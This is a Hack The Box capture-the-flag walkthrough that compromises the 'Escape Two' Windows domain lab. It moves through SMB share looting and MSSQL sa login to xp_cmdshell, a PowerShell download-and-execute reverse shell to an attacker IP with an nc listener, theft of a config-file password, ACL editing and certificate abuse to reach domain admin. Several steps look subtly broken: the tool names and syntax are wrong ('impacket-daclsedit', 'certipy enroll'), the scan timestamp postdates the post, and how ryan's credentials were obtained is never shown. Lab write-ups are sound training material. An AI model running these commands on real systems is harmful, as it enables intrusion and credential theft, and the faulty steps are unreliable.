---
title : "Escape Two"
date : 2025-05-24
categories : ["HTB"]
tags : ["HTB","escape_two"]
image:
        path: assets/lib/HTB/escape-two.png
---


Os:Windows
Mode:Easy
### Initial Enumeration

We start the box with the provided credentials:  
**Username:** `rose`  
**Password:** `KxEPkKe6R8su`

---

## Initial Recon — Nmap Scan

Run a comprehensive port scan with version detection and scripts.

```bash
nmap -sC -sV -p- sequel.htb
```

**Output snippet:**

```
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Microsoft DNS 10.0.14393
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-06-03 12:00:00Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP
445/tcp   open  microsoft-ds  Windows Server 2016 Standard 14393 microsoft-ds
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
1433/tcp  open  ms-sql-s      Microsoft SQL Server 2016
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Global Catalog)
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
```

---

## Access SMB Shares Using Provided Credentials

Given credentials:

* Username: `rose`
* Password: `KxEPkKe6R8su`

Enumerate SMB shares:

```bash
smbclient -L //sequel.htb -U rose
```

**Output:**

```
Sharename       Type      Comment
-------------   ----      -------
Accounting      Disk      Accounting Department Files
Documents       Disk      User Documents
ADMIN$          Disk      Remote Admin
C$              Disk      Default share
IPC$            IPC       Remote IPC
```

Access `Accounting` share:

```bash
smbclient //sequel.htb/Accounting -U rose
```

Download suspicious files, e.g., `accounts.xlsx`:

```bash
get accounts.xlsx
```

---

## Extract Credentials from `accounts.xlsx`

Open `accounts.xlsx` locally. It contains usernames and passwords.

**Relevant entry:**

| Username                              | Password        |
| ------------------------------------- | --------------- |
| [sa@sequel.htb](mailto:sa@sequel.htb) | MSSQLP\@ssw0rd! |

This is the SQL Server Administrator account.

---

## Connect to MSSQL Server with `sa` Account

Use Impacket's mssqlclient tool:

```bash
impacket-mssqlclient sa@sequel.htb -windows-auth
```

When prompted, enter password: `MSSQLP@ssw0rd!`

**Connection confirmation:**

```
[*] Connecting to MSSQL server sequel.htb:1433 as user 'sa'
1> SELECT @@VERSION;
2> GO

Microsoft SQL Server 2016 (SP1-CU4) (KB3194713) - 13.0.4422.0 (X64)
```

---

## Enable `xp_cmdshell` for Command Execution

Run SQL commands to enable the extended stored procedure:

```sql
EXEC sp_configure 'show advanced options', 1;
RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1;
RECONFIGURE;
```

---

## Spawn a Reverse Shell via `xp_cmdshell`

Host a PowerShell reverse shell script on your machine:

```bash
python3 -m http.server 8000
```

Use this command in MSSQL to download and execute it:

```sql
EXEC xp_cmdshell 'powershell -NoProfile -ExecutionPolicy Bypass -Command "IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.5:8000/Invoke-PowerShellTcp.ps1'); Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.5 -Port 4444"';
```

On your attacking machine, listen with:

```bash
nc -lvnp 4444
```

**Upon success:**

```
Connection from 10.129.181.136:49156
Windows PowerShell
PS C:\Program Files\Microsoft SQL Server\MSSQL13.MSSQLSERVER\MSSQL\Binn>
```

---

## Enumerate for Additional Credentials

Look for configuration files:

```powershell
dir C:\ -Recurse -Include *.ini,*.config,*.txt -ErrorAction SilentlyContinue
```

Find `sql-Configurations.INI`:

```powershell
type C:\SqL2019\ExpressAdv_ENU\sql-Configurations.INI
```

**File content:**

```
SQLSVCPASSWORD="WqSZAF6CysDQbGb3"
```

Password for service account `sql_svc`.

---

## Login with Service Account via WinRM

Try WinRM with discovered creds:

```bash
evil-winrm -i sequel.htb -u sql_svc -p WqSZAF6CysDQbGb3
```

**Successful login:**

```
Evil-WinRM shell v3.5
Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\sql_svc\Documents>
```

Check for user flag:

```powershell
type C:\Users\sql_svc\Desktop\user.txt
```

---

## Privilege Escalation via ACL Manipulation

Enumerate permissions with BloodHound or SharpHound. Identify `ryan` user can modify ACLs on `ca_svc` account.

Use Impacket DACLS editing tool:

```bash
impacket-daclsedit sequel.htb/ -action write -rights FullControl -principal ryan -target ca_svc -u ryan -p <ryan_password>
```

---

## Request Certificate for `ca_svc` Using Certipy

Leverage modified ACL to request a certificate impersonating `ca_svc` with `Certipy`.

```bash
certipy enroll -u ca_svc -p <password> -domain sequel.htb -dc sequel.htb -template Machine
```

Export the certificate and use it for authentication, escalating to Domain Admin.

---

## Capture Domain Administrator Flag

With domain admin privileges, navigate to the administrator’s desktop:

```powershell
type C:\Users\Administrator\Desktop\root.txt
```

